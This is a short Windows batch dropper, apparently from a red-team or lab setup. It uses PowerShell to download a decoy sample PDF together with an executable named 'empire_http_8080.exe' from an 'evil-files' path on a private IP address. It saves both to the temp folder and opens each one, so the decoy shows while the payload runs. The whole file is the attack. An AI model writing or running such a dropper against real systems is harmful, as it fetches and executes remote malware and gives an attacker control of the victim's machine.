@echo off

set files='https://filesamples.com/samples/document/pdf/sample3.pdf','https://192.168.122.108/evil-files/empire_http_8080.exe'

powershell "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"



